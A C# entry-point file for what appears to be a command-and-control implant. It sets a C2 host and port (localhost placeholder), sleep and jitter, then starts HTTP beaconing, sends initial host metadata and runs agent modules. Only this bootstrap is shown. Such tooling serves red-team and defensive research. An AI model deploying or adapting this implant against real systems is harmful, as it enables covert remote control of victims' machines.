using Agent.Models;
using Agent.Modules;
using Agent.Controllers;

namespace Agent
{
    class Agent
    {
        public Agent() { ExecuteAgent(); }

        public static void Main(string[] args) { new Agent(); }

        public static void Execute() { new Agent(); }

        public void ExecuteAgent()
        {
            var agentId = Helpers.GenerateRandomString(8);

            // Set Agent configuration
            var config = new ConfigController();
            config.SetOption(ConfigurationSettings.AgentId, agentId);
            config.SetOption(ConfigurationSettings.C2Host, "127.0.0.1");
            config.SetOption(ConfigurationSettings.C2Port, 8080);
            config.SetOption(ConfigurationSettings.SleepTime, 5); // seconds
            config.SetOption(ConfigurationSettings.Jitter, 0); // percent

            // Start comm module
            var comm = new HTTPCommModule();
            comm.Initialise(config);

            var metadata = Helpers.GetInitialMetadata(agentId);

            // Start the agent
            var agent = new AgentController(config, comm);
            agent.InitialCheckIn(metadata);
            agent.AddAgentModule(new CoreAgentModule());
            agent.Run();
        }
    }
}